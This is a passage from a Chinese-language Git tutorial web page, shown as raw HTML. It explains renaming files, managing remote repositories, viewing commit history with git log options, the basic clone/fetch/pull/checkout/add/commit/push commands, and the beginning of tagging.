class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">mv</span> README.md README</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    renamed:    README.md -&gt; README</span><br></pre></td></tr></table></figure></li><li><p>运行<code>git mv</code>相当于运行了三条命令：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mv</span> README.md README</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">rm</span> README.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add README</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="使用远程仓库">使用远程仓库</h2><h3 id="查看远程仓库">查看远程仓库</h3><ul><li><p>如果想查看你已经配置的远程仓库服务器，可以运行 <code>git remote</code> 命令。 它会列出你指定的每一个远程服务器的简写。 如果你已经克隆了自己的仓库，那么至少应该能看到 origin ——这是 Git 给你克隆的仓库服务器的默认名字：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/schacon/ticgit</span></span><br><span class="line">Cloning into &#x27;ticgit&#x27;...</span><br><span class="line">remote: Reusing existing pack: 1857, done.</span><br><span class="line">remote: Total 1857 (delta 0), reused 0 (delta 0)</span><br><span class="line">Receiving objects: 100% (1857/1857), 374.35 KiB | 268.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (772/772), done.</span><br><span class="line">Checking connectivity... done.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ticgit</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure></li><li><p>你也可以指定选项 <code>-v</code>，会显示需要读写远程仓库使用的 Git 保存的简写与其对应的 URL。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote -v</span></span><br><span class="line">originhttps://github.com/schacon/ticgit (fetch)</span><br><span class="line">originhttps://github.com/schacon/ticgit (push)</span><br></pre></td></tr></table></figure></li><li><p>如果你的远程仓库不止一个，该命令会将它们全部列出。 例如，与几个协作者合作的，拥有多个远程仓库的仓库看起来像下面这样：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> grit</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote -v</span></span><br><span class="line">bakkdoor  https://github.com/bakkdoor/grit (fetch)</span><br><span class="line">bakkdoor  https://github.com/bakkdoor/grit (push)</span><br><span class="line">cho45     https://github.com/cho45/grit (fetch)</span><br><span class="line">cho45     https://github.com/cho45/grit (push)</span><br><span class="line">defunkt   https://github.com/defunkt/grit (fetch)</span><br><span class="line">defunkt   https://github.com/defunkt/grit (push)</span><br><span class="line">koke      git://github.com/koke/grit.git (fetch)</span><br><span class="line">koke      git://github.com/koke/grit.git (push)</span><br><span class="line">origin    git@github.com:mojombo/grit.git (fetch)</span><br><span class="line">origin    git@github.com:mojombo/grit.git (push)</span><br></pre></td></tr></table></figure></li><li><p>如果想要查看某一个远程仓库的更多信息，可以使用 <code>git remote show &lt;remote&gt;</code> 命令。 如果想以一个特定的缩写名运行这个命令，例如 <code>origin</code>，会得到像下面类似的信息：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote show origin</span></span><br><span class="line">* remote origin</span><br><span class="line">  Fetch URL: https://github.com/schacon/ticgit</span><br><span class="line">  Push  URL: https://github.com/schacon/ticgit</span><br><span class="line">  HEAD branch: master</span><br><span class="line">  Remote branches:</span><br><span class="line">    master                               tracked</span><br><span class="line">    dev-branch                           tracked</span><br><span class="line">  Local branch configured for &#x27;git pull&#x27;:</span><br><span class="line">    master merges with remote master</span><br><span class="line">  Local ref configured for &#x27;git push&#x27;:</span><br><span class="line">    master pushes to master (up to date)</span><br></pre></td></tr></table></figure></li></ul><h3 id="添加远程仓库">添加远程仓库</h3><ul><li><p>运行 <code>git remote add &lt;shortname&gt; &lt;url&gt;</code> 添加一个新的远程 Git 仓库，同时指定一个方便使用的简写：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote</span></span><br><span class="line">origin</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add pb https://github.com/paulboone/ticgit</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote -v</span></span><br><span class="line">originhttps://github.com/schacon/ticgit (fetch)</span><br><span class="line">originhttps://github.com/schacon/ticgit (push)</span><br><span class="line">pbhttps://github.com/paulboone/ticgit (fetch)</span><br><span class="line">pbhttps://github.com/paulboone/ticgit (push)</span><br></pre></td></tr></table></figure></li><li><p>现在你可以在命令行中使用字符串 <code>pb</code> 来代替整个 URL。 例如，如果你想拉取仓库中有但本地没有的信息，可以运行 <code>git fetch pb</code>：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git fetch pb</span></span><br><span class="line">remote: Counting objects: 43, done.</span><br><span class="line">remote: Compressing objects: 100% (36/36), done.</span><br><span class="line">remote: Total 43 (delta 10), reused 31 (delta 5)</span><br><span class="line">Unpacking objects: 100% (43/43), done.</span><br><span class="line">From https://github.com/paulboone/ticgit</span><br><span class="line"> * [new branch]      master     -&gt; pb/master</span><br><span class="line"> * [new branch]      ticgit     -&gt; pb/ticgit</span><br></pre></td></tr></table></figure></li></ul><h3 id="重命名与移除">重命名与移除</h3><ul><li><p>你可以运行 <code>git remote rename</code> 来修改一个远程仓库的简写名。 例如，想要将 <code>pb</code> 重命名为 <code>paul</code>，可以用 <code>git remote rename</code> 这样做：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote rename pb paul</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote</span></span><br><span class="line">origin</span><br><span class="line">paul</span><br></pre></td></tr></table></figure></li><li><p>值得注意的是这同样也会修改你所有远程跟踪的分支名字。 那些过去引用 <code>pb/master</code> 的现在会引用 <code>paul/master</code>。如果因为一些原因想要移除一个远程仓库，可以使用 <code>git remote remove</code> 或 <code>git remote rm</code> ：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote remove paul</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure></li><li><p>一旦你使用这种方式删除了一个远程仓库，那么所有和这个远程仓库相关的远程跟踪分支以及配置信息也会一起被删除。</p></li></ul><h2 id="查看提交历史">查看提交历史</h2><ul><li><p>在提交了若干更新，又或者克隆了某个项目之后，你也许想回顾下提交历史。 完成这个任务最简单而又有效的工具是 <code>git log</code> 命令。使用“simplegit”项目作为演示，首先运行下面的命令获取项目：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/schacon/simplegit-progit</span><br></pre></td></tr></table></figure></li><li><p>获取完毕后，在该项目中运行<code>git log</code>命令，可以看到如下输出：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span></span></span><br><span class="line">commit ca82a6dff817ec66f44342007202690a93763949 (HEAD -&gt; master, origin/master, origin/HEAD)</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Mon Mar 17 21:52:11 2008 -0700</span><br><span class="line"></span><br><span class="line">    changed the verison number</span><br><span class="line"></span><br><span class="line">commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Sat Mar 15 16:40:33 2008 -0700</span><br><span class="line"></span><br><span class="line">    removed unnecessary test code</span><br><span class="line"></span><br><span class="line">commit a11bef06a3f659402fe7563abf99ad00de2209e6</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Sat Mar 15 10:31:28 2008 -0700</span><br><span class="line"></span><br><span class="line">    first commit</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>不传入任何参数的默认情况下，<code>git log</code> 会按时间先后顺序列出所有的提交，最近的更新排在最上面。 正如你所看到的，这个命令会列出每个提交的 SHA-1 校验和、作者的名字和电子邮件地址、提交时间以及提交说明。如果希望以补丁的形式查看每次提交所引入的差异，可以使用<code>-p</code>或者<code>--patch</code>，同时可以限制显示的日志条目数量，例如<code>-2</code>代表只显示最近的2次提交：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> -p -2</span></span><br><span class="line">commit ca82a6dff817ec66f44342007202690a93763949 (HEAD -&gt; master, origin/master, origin/HEAD)</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Mon Mar 17 21:52:11 2008 -0700</span><br><span class="line"></span><br><span class="line">    changed the verison number</span><br><span class="line"></span><br><span class="line">diff --git a/Rakefile b/Rakefile</span><br><span class="line">index a874b73..8f94139 100644</span><br><span class="line">--- a/Rakefile</span><br><span class="line">+++ b/Rakefile</span><br><span class="line">@@ -5,7 +5,7 @@ require &#x27;rake/gempackagetask&#x27;</span><br><span class="line"> spec = Gem::Specification.new do |s|</span><br><span class="line">     s.platform  =   Gem::Platform::RUBY</span><br><span class="line">     s.name      =   &quot;simplegit&quot;</span><br><span class="line">-    s.version   =   &quot;0.1.0&quot;</span><br><span class="line">+    s.version   =   &quot;0.1.1&quot;</span><br><span class="line">     s.author    =   &quot;Scott Chacon&quot;</span><br><span class="line">     s.email     =   &quot;schacon@gmail.com&quot;</span><br><span class="line">     s.summary   =   &quot;A simple gem for using Git in Ruby code.&quot;</span><br><span class="line"></span><br><span class="line">commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Sat Mar 15 16:40:33 2008 -0700</span><br><span class="line"></span><br><span class="line">    removed unnecessary test code</span><br><span class="line"></span><br><span class="line">diff --git a/lib/simplegit.rb b/lib/simplegit.rb</span><br><span class="line">index a0a60ae..47c6340 100644</span><br><span class="line">--- a/lib/simplegit.rb</span><br><span class="line">+++ b/lib/simplegit.rb</span><br><span class="line">@@ -18,8 +18,3 @@ class SimpleGit</span><br><span class="line">     end</span><br><span class="line"></span><br><span class="line"> end</span><br><span class="line">-</span><br><span class="line">-if $0 == __FILE__</span><br><span class="line">-  git = SimpleGit.new</span><br><span class="line">-  puts git.show</span><br><span class="line">-end</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>使用<code>--stat</code>可以快速浏览每次提交的简略信息：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --<span class="built_in">stat</span></span></span><br><span class="line">commit ca82a6dff817ec66f44342007202690a93763949 (HEAD -&gt; master, origin/master, origin/HEAD)</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Mon Mar 17 21:52:11 2008 -0700</span><br><span class="line"></span><br><span class="line">    changed the verison number</span><br><span class="line"></span><br><span class="line"> Rakefile | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Sat Mar 15 16:40:33 2008 -0700</span><br><span class="line"></span><br><span class="line">    removed unnecessary test code</span><br><span class="line"></span><br><span class="line"> lib/simplegit.rb | 5 -----</span><br><span class="line"> 1 file changed, 5 deletions(-)</span><br><span class="line"></span><br><span class="line">commit a11bef06a3f659402fe7563abf99ad00de2209e6</span><br><span class="line">Author: Scott Chacon &lt;schacon@gmail.com&gt;</span><br><span class="line">Date:   Sat Mar 15 10:31:28 2008 -0700</span><br><span class="line"></span><br><span class="line">    first commit</span><br><span class="line"></span><br><span class="line"> README           |  6 ++++++</span><br><span class="line"> Rakefile         | 23 +++++++++++++++++++++++</span><br><span class="line"> lib/simplegit.rb | 25 +++++++++++++++++++++++++</span><br><span class="line"> 3 files changed, 54 insertions(+)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>--pretty</code>选项可以选择显示样式，比如在一行内查看每次提交：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">ca82a6dff817ec66f44342007202690a93763949 (HEAD -&gt; master, origin/master, origin/HEAD) changed the verison number</span><br><span class="line">085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7 removed unnecessary test code</span><br><span class="line">a11bef06a3f659402fe7563abf99ad00de2209e6 first commit</span><br></pre></td></tr></table></figure></li><li><p>或者使用<code>--pretty=format:</code>来自定义显示样式：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> git <span class="built_in">log</span> --pretty=format:<span class="string">&quot;%h - %an, %ar : %s&quot;</span></span></span><br><span class="line">ca82a6d - Scott Chacon, 15 years ago : changed the verison number</span><br><span class="line">085bb3b - Scott Chacon, 15 years ago : removed unnecessary test code</span><br><span class="line">a11bef0 - Scott Chacon, 15 years ago : first commit</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> --pretty=format 常用选项 </summary>              <div class='content'>              <table><thead><tr><th style="text-align:left">选项</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>%H</code></td><td style="text-align:left">提交的完整哈希值</td></tr><tr><td style="text-align:left"><code>%h</code></td><td style="text-align:left">提交的简写哈希值</td></tr><tr><td style="text-align:left"><code>%T</code></td><td style="text-align:left">树的完整哈希值</td></tr><tr><td style="text-align:left"><code>%t</code></td><td style="text-align:left">树的简写哈希值</td></tr><tr><td style="text-align:left"><code>%P</code></td><td style="text-align:left">父提交的完整哈希值</td></tr><tr><td style="text-align:left"><code>%p</code></td><td style="text-align:left">父提交的简写哈希值</td></tr><tr><td style="text-align:left"><code>%an</code></td><td style="text-align:left">作者名字</td></tr><tr><td style="text-align:left"><code>%ae</code></td><td style="text-align:left">作者的电子邮件地址</td></tr><tr><td style="text-align:left"><code>%ad</code></td><td style="text-align:left">作者修订日期（可以用 --date=选项 来定制格式）</td></tr><tr><td style="text-align:left"><code>%ar</code></td><td style="text-align:left">作者修订日期，按多久以前的方式显示</td></tr><tr><td style="text-align:left"><code>%cn</code></td><td style="text-align:left">提交者的名字</td></tr><tr><td style="text-align:left"><code>%ce</code></td><td style="text-align:left">提交者的电子邮件地址</td></tr><tr><td style="text-align:left"><code>%cd</code></td><td style="text-align:left">提交日期</td></tr><tr><td style="text-align:left"><code>%cr</code></td><td style="text-align:left">提交日期（距今多长时间）</td></tr><tr><td style="text-align:left"><code>%s</code></td><td style="text-align:left">提交说明</td></tr></tbody></table>              </div>            </details><details class="folding-tag" yellow><summary> git log常用选项 </summary>              <div class='content'>              <table><thead><tr><th style="text-align:left">选项</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>-p</code></td><td style="text-align:left">按补丁格式显示每个提交引入的差异。</td></tr><tr><td style="text-align:left"><code>--stat</code></td><td style="text-align:left">显示每次提交的文件修改统计信息。</td></tr><tr><td style="text-align:left"><code>--shortstat</code></td><td style="text-align:left">只显示 --stat 中最后的行数修改添加移除统计。</td></tr><tr><td style="text-align:left"><code>--name-only</code></td><td style="text-align:left">仅在提交信息后显示已修改的文件清单。</td></tr><tr><td style="text-align:left"><code>--name-status</code></td><td style="text-align:left">显示新增、修改、删除的文件清单。</td></tr><tr><td style="text-align:left"><code>--abbrev-commit</code></td><td style="text-align:left">仅显示 SHA-1 校验和所有 40 个字符中的前几个字符。</td></tr><tr><td style="text-align:left"><code>--relative-date</code></td><td style="text-align:left">使用较短的相对时间而不是完整格式显示日期（比如“2 weeks ago”）。</td></tr><tr><td style="text-align:left"><code>--graph</code></td><td style="text-align:left">在日志旁以 ASCII 图形显示分支与合并历史。</td></tr><tr><td style="text-align:left"><code>--pretty</code></td><td style="text-align:left">使用其他格式显示历史提交信息。可用的选项包括 oneline、short、full、fuller 和 format（用来定义自己的格式）。</td></tr><tr><td style="text-align:left"><code>--oneline</code></td><td style="text-align:left"><code>--pretty=oneline --abbrev-commit</code> 合用的简写。</td></tr></tbody></table>              </div>            </details><details class="folding-tag" blue><summary> 限制git log输出的选项 </summary>              <div class='content'>              <table><thead><tr><th style="text-align:left">选项</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>-&lt;n&gt;</code></td><td style="text-align:left">仅显示最近的 n 条提交。</td></tr><tr><td style="text-align:left"><code>--since</code>, <code>--after</code></td><td style="text-align:left">仅显示指定时间之后的提交。</td></tr><tr><td style="text-align:left"><code>--until</code>, <code>--before</code></td><td style="text-align:left">仅显示指定时间之前的提交。</td></tr><tr><td style="text-align:left"><code>--author</code></td><td style="text-align:left">仅显示作者匹配指定字符串的提交。</td></tr><tr><td style="text-align:left"><code>--committer</code></td><td style="text-align:left">仅显示提交者匹配指定字符串的提交。</td></tr><tr><td style="text-align:left"><code>--grep</code></td><td style="text-align:left">仅显示提交说明中包含指定字符串的提交。</td></tr><tr><td style="text-align:left"><code>-S</code></td><td style="text-align:left">仅显示添加或删除内容匹配指定字符串的提交。</td></tr></tbody></table>              </div>            </details></li></ul><h2 id="Git的基本操作">Git的基本操作</h2><ul><li>以下6条命令是Git最常使用的命令：<ul><li>git clone / git fetch</li><li>git pull</li><li>git checkout (git switch / git restore)</li><li>git add</li><li>git commit</li><li>git push</li></ul></li></ul><p><img src="https://s1.vika.cn/space/2023/07/29/f0e889650d7c48c9b66463f0e1d2930c" alt="git-command"></p><ul><li>其中：<ul><li>workspace：工作区</li><li>staging area：暂存区（缓存区）</li><li>local repository：本地仓库（版本库）</li><li>remote repository：远程仓库</li></ul></li></ul><h3 id="git-clone">git clone</h3><ul><li><p>如果需要下载Git仓库到本地目录中，可以使用下面两种指令。第一种将Git仓库克隆到当前执行Git命令的目录下，第二种将Git仓库克隆到指定目录下。当你执行 <code>git clone</code> 命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。其中：</p><ul><li>&lt;repo&gt;：需要克隆的Git仓库</li><li>&lt;directory&gt;：本地目录</li></ul><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;repo&gt;</span><br><span class="line">git clone &lt;repo&gt; &lt;directory&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="git-fetch">git fetch</h3><ul><li><p><code>git fetch</code>用于更新本地仓库，但不会自动合并或修改本地代码，在查看远程仓库最新更新、了解其他开发者的提交或者想手动处理合并时，则使用<code>git fetch</code>操作，然后使用<code>git merge</code>合并分支。其中：</p><ul><li>&lt;alias&gt;：远程仓库的别名，通常是origin</li><li>&lt;branch&gt;：分支名称，如master</li></ul><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git fetch &lt;alias&gt;</span><br><span class="line">git merge &lt;alias&gt;/&lt;branch&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="git-pull">git pull</h3><ul><li><p><code>git pull</code>与<code>git clone</code>的作用类似，都是从代码仓库获取代码，不同的是，<code>git clone</code>会覆盖本地仓库中的内容，<code>git pull</code>则是将远程拉取的代码与本地的版本合并，本质是将<code>git fetch</code>和<code>git merge</code>一并完成。<code>git pull</code>有三种写法，第一种是从远程仓库拉取当前所跟踪的分支，第二种则指定远程分支，第三种则指定本地分支。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git pull &lt;远程仓库名&gt;</span><br><span class="line">git pull &lt;远程仓库名&gt; &lt;远程分支名&gt;</span><br><span class="line">git pull &lt;远程仓库名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure></li><li><p>在指定本地分支时，远程分支不可以省略，即不可以写成如下样式：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull &lt;远程仓库名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="git-checkout-git-switch-git-restore">git checkout (git switch + git restore)</h3><ul><li><p><code>git checkout</code>用于切换本地分支，可以从当前分支切换到另一个存在的分支。同时<code>git checkout</code>还可以将文件恢复到最近一次提交的状态，即撤销对文件的修改。如果需要切换分支的同时创建分支，可以使用<code>-b</code>参数</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;分支名&gt;</span><br><span class="line">git checkout -b &lt;新分支名&gt;</span><br><span class="line">git checkout &lt;文件名&gt;</span><br></pre></td></tr></table></figure></li><li><p>在2.23版本中，Git引入了两个新的指令：switch和restore，替代了部分checkout的功能。其中switch用来切换分支，restore用来恢复文件，但checkout仍然可以继续使用。在使用switch切换分支时，可以使用<code>-c</code>参数同时创建分支</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git switch &lt;分支名&gt;</span><br><span class="line">git switch -c &lt;新分支名&gt;</span><br><span class="line">gitt restore &lt;文件名&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="git-add">git add</h3><ul><li><p><code>git add</code>命令可将该文件的修改添加到暂存区。通过运行<code>git add</code>命令，你可以告诉 Git 哪些文件的修改应该包含在下一次提交（commit）中。</p></li><li><p>添加一个或多个文件到暂存区：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add [file1] [file2] ...</span><br></pre></td></tr></table></figure><p>添加指定目录到暂存区，包括子目录：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add [dir]</span><br></pre></td></tr></table></figure><p>添加当前目录下的所有文件到暂存区：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure></li></ul><h3 id="git-commit">git commit</h3><ul><li><p><code>git commit</code>命令将暂存区内容添加到本地仓库中。</p></li><li><p>提交暂存区到本地仓库中，[message] 可以是一些备注信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -m<span class="meta"> [message]</span></span><br></pre></td></tr></table></figure><p>提交暂存区的指定文件到仓库区：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit <span class="comment">[file1]</span> <span class="comment">[file2]</span> ... -m <span class="comment">[message]</span></span><br></pre></td></tr></table></figure><p><code>-a</code>参数设置修改文件后不需要执行 git add 命令，直接来提交</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -a</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="git-push">git push</h3><ul><li><p>使用<code>git push</code>可以将项目推送到上游，比如想要将 <code>master</code> 分支推送到 <code>origin</code> 服务器时：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li><li><p>只有当你有所克隆服务器的写入权限，并且之前没有人推送过时，这条命令才能生效。 当你和其他人在同一时间克隆，他们先推送到上游然后你再推送到上游，你的推送就会被拒绝，需要先抓取他们的工作并将其合并进你的工作后才能推送。</p></li></ul><h2 id="为提交结点打上标签">为提交结点打上标签</h2><ul><li>像其他版本控制系统（VCS）一样，Git 可以给仓库历史中的某一个提交打上标签，以示重要。 比较有代表性的是人们会使用这个功能来标记发布结点（ <code>v1.0</code> 、 <code>v2.0</code> 等等）。</li></ul><h3 id="创建标签">创建标签</h3><ul><li><p>Git 支持两种标签：轻量标签（lightweight）与附注标签（annotated）。</p><ul><li><p>轻量标签没有保存任何其他信息，只需要提供标签名字：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag v1.4-lw</span><br></pre></td></tr></table></figure></li><li><p>而附注标签是存储在 Git 数据库中的一个完整对象， 它们是可以被校验的，其中包含打标签者的名字、电子邮件地址、日期时间， 此外还有一个标签信息，并且可以使用 GNU Privacy Guard （GPG）签名并验证。 